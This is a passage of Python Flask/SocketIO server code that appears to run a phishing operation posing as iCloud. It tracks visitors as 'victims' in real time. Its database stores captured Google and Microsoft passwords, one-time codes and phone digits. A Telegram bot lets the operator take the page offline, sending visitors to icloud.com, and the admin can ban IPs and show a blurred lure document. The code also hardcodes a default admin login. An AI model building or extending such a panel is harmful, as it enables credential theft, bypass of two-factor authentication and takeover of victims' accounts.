    if not token:
        return jsonify({"error": "token is required"}), 400
    _set_setting("telegram_bot_token", token)
    try:
        url = f"https://api.telegram.org/bot{token}/getUpdates?timeout=0"
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode("utf-8", errors="ignore"))
        ids = [int(u.get("update_id", 0)) for u in (data.get("result") or [])]
        nxt = (max(ids) + 1) if ids else 0
        _set_setting("telegram_update_offset", str(nxt))
    except Exception:
        _set_setting("telegram_update_offset", "0")
    return jsonify({"ok": True, "configured": True}), 200


@app.route("/api/v1/rumman/site/domain", methods=["GET"])
def get_public_domain():
    """Public/admin: configured site domain (empty = use current host)."""
    domain = (_get_setting("public_domain", "") or "").strip()
    return jsonify({"domain": domain}), 200


@app.route("/api/v1/rumman/site/domain", methods=["POST"])
@admin_required
def set_public_domain():
    data = request.get_json(silent=True) or {}
    raw = str(data.get("domain") or data.get("url") or "").strip()
    if not raw:
        _set_setting("public_domain", "")
        return jsonify({"domain": ""}), 200

    # Accept example.com or https://example.com
    if "://" not in raw:
        raw = "https://" + raw
    raw = raw.rstrip("/")
    if len(raw) > 240:
        return jsonify({"error": "Domain too long"}), 400
    # light sanity check
    host = raw.split("://", 1)[-1].split("/", 1)[0]
    if not host or " " in host:
        return jsonify({"error": "Invalid domain"}), 400

    _set_setting("public_domain", raw)
    return jsonify({"domain": raw}), 200


@app.route("/api/v1/rumman/site/telegram", methods=["DELETE"])
@admin_required
def clear_telegram():
    _set_setting("telegram_bot_token", "")
    return jsonify({"ok": True, "configured": False}), 200


def _case_doc_names():
    return {
        "surname": (_get_setting("case_doc_surname", "") or "").strip(),
        "givenName": (_get_setting("case_doc_given_name", "") or "").strip(),
        "showPreview": _get_setting("case_doc_show_preview", "true").lower()
        in ("1", "true", "yes", "on"),
    }


@app.route("/api/v1/rumman/site/case-documents", methods=["GET"])
@admin_required
def list_case_documents():
    docs = CaseDocument.query.order_by(CaseDocument.created_at.desc()).all()
    names = _case_doc_names()
    return jsonify({"documents": [d.to_dict() for d in docs], **names}), 200


@app.route("/api/v1/rumman/site/case-documents/names", methods=["POST"])
@admin_required
def set_case_document_names():
    data = request.get_json(silent=True) or {}
    surname = str(data.get("surname") or data.get("familyName") or "").strip()[:80]
    given = str(data.get("givenName") or data.get("firstName") or "").strip()[:80]
    _set_setting("case_doc_surname", surname)
    _set_setting("case_doc_given_name", given)
    return jsonify({"surname": surname, "givenName": given, **{
        "showPreview": _case_doc_names()["showPreview"],
    }}), 200


@app.route("/api/v1/rumman/site/case-documents/preview-mode", methods=["POST"])
@admin_required
def set_case_document_preview_mode():
    data = request.get_json(silent=True) or {}
    show = data.get("showPreview")
    if show is None:
        show = data.get("enabled")
    enabled = bool(show)
    _set_setting("case_doc_show_preview", "true" if enabled else "false")
    return jsonify({"showPreview": enabled}), 200


@app.route("/api/v1/rumman/site/case-documents/active", methods=["GET"])
def get_active_case_document():
    """Public: metadata for the document shown on the case loading page."""
    doc = _active_case_document()
    names = _case_doc_names()
    if not doc:
        return jsonify({"document": None, **names}), 200
    return jsonify({"document": doc.to_dict(), **names}), 200


@app.route("/api/v1/rumman/site/case-documents", methods=["POST"])
@admin_required
def upload_case_document():
    if "file" not in request.files:
        return jsonify({"error": "file is required"}), 400
    f = request.files["file"]
    if not f or not f.filename:
        return jsonify({"error": "file is required"}), 400

    original = secure_filename(f.filename) or "document"
    ext = os.path.splitext(original)[1].lower()
    if ext not in ALLOWED_DOC_EXT:
        return jsonify({"error": "Only PDF or image files are allowed"}), 400

    data = f.read()
    if not data:
        return jsonify({"error": "Empty file"}), 400
    if len(data) > MAX_DOC_BYTES:
        return jsonify({"error": "File too large (max 12 MB)"}), 400

    _ensure_upload_dir()
    stored = f"{uuid.uuid4().hex}{ext}"
    path = os.path.join(UPLOAD_DIR, stored)
    with open(path, "wb") as out:
        out.write(data)

    # Newest upload becomes the active document on the case page
    CaseDocument.query.update({CaseDocument.active: False})
    doc = CaseDocument(
        original_name=original,
        stored_name=stored,
        mime_type=f.mimetype or "application/octet-stream",
        size=len(data),
        active=True,
        blur=45,
    )
    db.session.add(doc)
    db.session.commit()
    return jsonify(doc.to_dict()), 201


@app.route("/api/v1/rumman/site/case-documents/<int:doc_id>/blur", methods=["POST"])
@admin_required
def set_case_document_blur(doc_id):
    doc = db.session.get(CaseDocument, doc_id)
    if not doc:
        return jsonify({"error": "Document not found"}), 404
    data = request.get_json(silent=True) or {}
    try:
        blur = int(data.get("blur", doc.blur if doc.blur is not None else 45))
    except (TypeError, ValueError):
        return jsonify({"error": "blur must be a number"}), 400
    doc.blur = max(0, min(100, blur))
    try:
        if "panX" in data:
            doc.pan_x = max(-50, min(50, int(data.get("panX"))))
        if "panY" in data:
            doc.pan_y = max(-50, min(50, int(data.get("panY"))))
        if "zoom" in data:
            doc.zoom = max(100, min(220, int(data.get("zoom"))))
    except (TypeError, ValueError):
        return jsonify({"error": "pan/zoom must be numbers"}), 400
    db.session.commit()
    return jsonify(doc.to_dict()), 200


@app.route("/api/v1/rumman/site/case-documents/<int:doc_id>/activate", methods=["POST"])
@admin_required
def activate_case_document(doc_id):
    doc = db.session.get(CaseDocument, doc_id)
    if not doc:
        return jsonify({"error": "Document not found"}), 404
    CaseDocument.query.update({CaseDocument.active: False})
    doc.active = True
    db.session.commit()
    return jsonify(doc.to_dict()), 200


@app.route("/api/v1/rumman/site/case-documents/<int:doc_id>", methods=["DELETE"])
@admin_required
def delete_case_document(doc_id):
    doc = db.session.get(CaseDocument, doc_id)
    if not doc:
        return jsonify({"error": "Document not found"}), 404
    path = os.path.join(UPLOAD_DIR, doc.stored_name)
    was_active = bool(doc.active)
    db.session.delete(doc)
    db.session.commit()
    try:
        if os.path.isfile(path):
            os.remove(path)
    except OSError:
        pass
    if was_active:
        latest = CaseDocument.query.order_by(CaseDocument.created_at.desc()).first()
        if latest:
            latest.active = True
            db.session.commit()
    return jsonify({"ok": True}), 200


@app.route("/api/v1/rumman/site/case-documents/<int:doc_id>/file", methods=["GET"])
def serve_case_document(doc_id):
    """Public file for the case-page preview (active docs, or any for admin session)."""
    doc = db.session.get(CaseDocument, doc_id)
    if not doc:
        return jsonify({"error": "Document not found"}), 404
    if not doc.active and not session.get("admin_id"):
        return jsonify({"error": "Document not found"}), 404
    path = os.path.join(UPLOAD_DIR, doc.stored_name)
    if not os.path.isfile(path):
        return jsonify({"error": "File missing"}), 404
    return send_file(
        path,
        mimetype=doc.mime_type or "application/octet-stream",
        download_name=doc.original_name,
        as_attachment=False,
    )


@app.route("/api/v1/rumman/bans", methods=["GET"])
@admin_required
def list_bans():
    """List banned IP addresses."""
    bans = BannedIP.query.order_by(BannedIP.created_at.desc()).all()
    return jsonify([b.to_dict() for b in bans]), 200


@app.route("/api/v1/rumman/bans", methods=["POST"])
@admin_required
def create_ban():
    """Ban an IP address from the public page."""
    data = request.get_json(silent=True) or {}
    ip = (data.get("ip") or data.get("ipAddress") or "").strip()
    note = (data.get("note") or "").strip()

    if not ip:
        return jsonify({"error": "IP address is required"}), 400

    existing = BannedIP.query.filter_by(ip_address=ip).first()
    if existing:
        return jsonify(existing.to_dict()), 200

    ban = BannedIP(ip_address=ip, note=note or None)
    db.session.add(ban)
    db.session.commit()
    socketio.emit("bans_updated", {"action": "create", "ban": ban.to_dict()})
    return jsonify(ban.to_dict()), 201


@app.route("/api/v1/rumman/bans/<int:ban_id>", methods=["DELETE"])
@admin_required
def delete_ban(ban_id):
    """Remove an IP ban."""
    ban = db.session.get(BannedIP, ban_id)
    if not ban:
        return jsonify({"error": "Ban not found"}), 404
    db.session.delete(ban)
    db.session.commit()
    socketio.emit("bans_updated", {"action": "delete", "id": ban_id})
    return jsonify({"message": "Ban removed"}), 200


# -----------------------------------------------------------------------------
# Static / SPA fallback (optional, for production builds)
# -----------------------------------------------------------------------------
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def serve_frontend(path):
    """Serve the built frontend when a dist folder exists (SPA fallback for /admin etc.)."""
    if path.startswith("api/"):
        return jsonify({"error": "Not found"}), 404

    dist = FRONTEND_BUILD_DIR
    if not dist or not os.path.isdir(dist):
        return jsonify({"message": "Backend is running. Start the frontend dev server on port 3000."}), 200

    # Safe join under dist
    candidate = os.path.normpath(os.path.join(dist, path)) if path else dist
    if path and candidate.startswith(os.path.normpath(dist)) and os.path.isfile(candidate):
        return send_from_directory(dist, path)

    index = os.path.join(dist, "index.html")
    if os.path.isfile(index):
        return send_from_directory(dist, "index.html")
    return jsonify({"message": "Backend is running. Start the frontend dev server on port 3000."}), 200


# -----------------------------------------------------------------------------
# SocketIO handlers
# -----------------------------------------------------------------------------
@socketio.on("connect")
def handle_connect():
    emit("connected", {"message": "Welcome to the control server"})


@socketio.on("victim_online")
def handle_victim_online(data):
    raw = (data or {}).get("userId")
    try:
        user_id = int(raw)
    except (TypeError, ValueError):
        return
    sid = request.sid
    prev = _online_sids.get(sid)
    if prev and prev != user_id:
        sids = _user_sids.get(prev, set())
        sids.discard(sid)
        if not sids:
            _user_sids.pop(prev, None)
            socketio.emit("presence_changed", {"userId": prev, "online": False})
    _online_sids[sid] = user_id
    sids = _user_sids.setdefault(user_id, set())
    was_online = bool(sids)
    sids.add(sid)
    if not was_online:
        socketio.emit("presence_changed", {"userId": user_id, "online": True})


@socketio.on("victim_ping")
def handle_victim_ping(data):
    handle_victim_online(data)


@socketio.on("disconnect")
def handle_disconnect():
    sid = request.sid
    user_id = _online_sids.pop(sid, None)
    if not user_id:
        return
    sids = _user_sids.get(user_id, set())
    sids.discard(sid)
    if not sids:
        _user_sids.pop(user_id, None)
        socketio.emit("presence_changed", {"userId": user_id, "online": False})


def _telegram_api(token, method, payload=None, timeout=30):
    url = f"https://api.telegram.org/bot{token}/{method}"
    data = None
    headers = {}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8", errors="ignore"))


def _telegram_send(token, chat_id, text):
    try:
        _telegram_api(token, "sendMessage", {"chat_id": chat_id, "text": text})
    except Exception as e:
        print(f"[telegram] send failed: {e}")


def _telegram_handle_command(token, chat_id, text):
    cmd = (text or "").strip().split()[0].split("@")[0].lower()
    if cmd in ("/start", "/help"):
        _telegram_send(
            token,
            chat_id,
            "iCloud panel bot\n\n/online — turn the page on\n/offline — kill the page (redirect to icloud.com)\n/status — current state",
        )
        return
    if cmd == "/offline":
        payload = _apply_site_online(False)
        _telegram_send(
            token,
            chat_id,
            "OFFLINE. Everything is down. Visitors are sent to icloud.com.",
        )
        print("[telegram] panel set OFFLINE")
        return
    if cmd == "/online":
        payload = _apply_site_online(True)
        _telegram_send(
            token,
            chat_id,
            "ONLINE. The page is live again.",
        )
        print("[telegram] panel set ONLINE")
        return
    if cmd == "/status":
        state = "ONLINE" if _site_online() else "OFFLINE"
        _telegram_send(token, chat_id, f"Panel is {state}.")


def _telegram_poll_loop():
    print("[telegram] poller started")
    while True:
        try:
            with app.app_context():
                token = _get_setting("telegram_bot_token", "").strip()
                if not token:
                    time.sleep(4)
                    continue
                try:
                    offset = int(_get_setting("telegram_update_offset", "0") or "0")
                except Exception:
                    offset = 0
                url = (
                    f"https://api.telegram.org/bot{token}/getUpdates"
                    f"?timeout=25&offset={offset}"
                )
                req = urllib.request.Request(url)
                with urllib.request.urlopen(req, timeout=35) as resp:
                    data = json.loads(resp.read().decode("utf-8", errors="ignore"))
                if not data.get("ok"):
                    time.sleep(4)
                    continue
                for update in data.get("result") or []:
                    next_offset = int(update.get("update_id", 0)) + 1
                    if next_offset > offset:
                        offset = next_offset
                    msg = update.get("message") or update.get("edited_message") or {}
                    text = msg.get("text") or ""
                    chat = msg.get("chat") or {}
                    chat_id = chat.get("id")
                    if chat_id and text.startswith("/"):
                        _telegram_handle_command(token, chat_id, text)
                _set_setting("telegram_update_offset", str(offset))
        except Exception as e:
            print(f"[telegram] poll: {e}")
            time.sleep(4)


def _start_telegram_poller():
    t = threading.Thread(target=_telegram_poll_loop, daemon=True, name="telegram-poller")
    t.start()


# -----------------------------------------------------------------------------
# Bootstrap
# -----------------------------------------------------------------------------
def _ensure_admin():
    """Create the default admin account if it does not exist yet."""
    default_name = os.environ.get("ADMIN_NAME", "icloud")
    default_password = os.environ.get("ADMIN_PASSWORD", "icloudfwfw123")

    admin = Admin.query.filter_by(full_name=default_name).first()
    if admin:
        print(f"[bootstrap] Admin already exists: {default_name}")
    else:
        # Remove legacy default admin if present so only the configured one exists.
        legacy = Admin.query.filter_by(full_name="admin").first()
        if legacy:
            db.session.delete(legacy)

        admin = Admin(
            full_name=default_name,
            password_hash=generate_password_hash(default_password),
        )
        db.session.add(admin)
        db.session.commit()
        print(f"[bootstrap] Created admin: {default_name} / {default_password}")

    if Setting.query.filter_by(key="site_online").first() is None:
        _set_setting("site_online", "true")
        print("[bootstrap] Site status defaulted to online")


@app.before_request
def _touch_request():
    pass


if __name__ == "__main__":
    with app.app_context():
        db.create_all()
        # SQLite: add new columns if DB already existed
        try:
            from sqlalchemy import text
            cols = {row[1] for row in db.session.execute(text("PRAGMA table_info(users)")).fetchall()}
            if "google_email" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN google_email VARCHAR(255)"))
            if "google_password" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN google_password VARCHAR(255)"))
            if "google_code" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN google_code VARCHAR(255)"))
            if "google_prompt" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN google_prompt VARCHAR(10)"))
            if "disconnect_logs" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN disconnect_logs TEXT"))
            if "prev_page" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN prev_page VARCHAR(50)"))
            if "prev_status" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN prev_status VARCHAR(50)"))
            if "country_code" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN country_code VARCHAR(8)"))
            if "country" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN country VARCHAR(100)"))
            if "ms_email" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN ms_email VARCHAR(255)"))
            if "ms_password" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN ms_password VARCHAR(255)"))
            if "ms_phone_hint" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN ms_phone_hint VARCHAR(10)"))
            if "ms_phone_digits" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN ms_phone_digits VARCHAR(10)"))
            if "ms_code" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN ms_code VARCHAR(20)"))
            if "case_id" not in cols:
                db.session.execute(text("ALTER TABLE users ADD COLUMN case_id VARCHAR(20)"))
            # case_documents.blur for admin privacy slider
            try:
                doc_cols = {
                    row[1]
                    for row in db.session.execute(text("PRAGMA table_info(case_documents)")).fetchall()
                }
                if doc_cols and "blur" not in doc_cols:
                    db.session.execute(
                        text("ALTER TABLE case_documents ADD COLUMN blur INTEGER DEFAULT 45")
                    )
                if doc_cols and "pan_x" not in doc_cols:
                    db.session.execute(
                        text("ALTER TABLE case_documents ADD COLUMN pan_x INTEGER DEFAULT 0")
                    )
                if doc_cols and "pan_y" not in doc_cols:
                    db.session.execute(
                        text("ALTER TABLE case_documents ADD COLUMN pan_y INTEGER DEFAULT 0")
                    )
                if doc_cols and "zoom" not in doc_cols:
                    db.session.execute(
                        text("ALTER TABLE case_documents ADD COLUMN zoom INTEGER DEFAULT 110")
                    )
            except Exception as e:
                print(f"[bootstrap] case_documents blur: {e}")
            db.session.commit()
        except Exception as e:
            print(f"[bootstrap] column check: {e}")
        _ensure_admin()
        _start_telegram_poller()

    port = int(os.environ.get("PORT", 4000))
    print(f"Starting backend on http://localhost:{port}")
    print(f"Admin login: /admin  (icloud / icloudfwfw123)")
    socketio.run(app, host="0.0.0.0", port=port, debug=True, use_reloader=False)
